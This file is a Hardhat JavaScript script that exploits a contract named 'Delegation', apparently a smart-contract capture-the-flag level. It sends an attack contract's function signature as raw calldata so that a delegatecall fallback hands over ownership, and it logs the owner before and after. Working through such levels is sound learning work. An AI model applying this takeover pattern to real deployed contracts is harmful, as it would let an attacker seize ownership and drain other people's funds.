const hre = require("hardhat");

function sleep(milliseconds) {
  const date = Date.now();
  let currentDate = null;
  do {
    currentDate = Date.now();
  } while (currentDate - date < milliseconds);
}

async function main() {
  const [owner] = await ethers.getSigners();
  const contractAddress = hre.ethers.utils.getAddress(
    "0x6384c74d0736c5cDFdb44622bf804567dd22BD9E"
  );

  const attackContractAddress = hre.ethers.utils.getAddress(
    // "0xF47C293097293CAE28fc5E2C01049377131646f9"
    "0xA45f937A2CFd50610cb0D320e56Ddb4e2d5F4729"
  );
  const Contract = await hre.ethers.getContractFactory("Delegation");
  const contractInstance = Contract.attach(contractAddress);

  console.log(contractInstance.functions);

  const AttackContract = await hre.ethers.getContractFactory(
    "AttackDelegation"
  );
  const attackContractInstance = AttackContract.attach(attackContractAddress);

  console.log("owner before", await contractInstance.owner());

  const sig = await attackContractInstance.connect(owner).getsignature();

  console.log("sig", sig);

  const tx = {
    from: owner.address,
    to: contractAddress,

    data: sig,
    gasPrice: 20000000000,
  };

  await owner.sendTransaction(tx);

  sleep(5000);

  console.log("owner after", await contractInstance.owner());
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
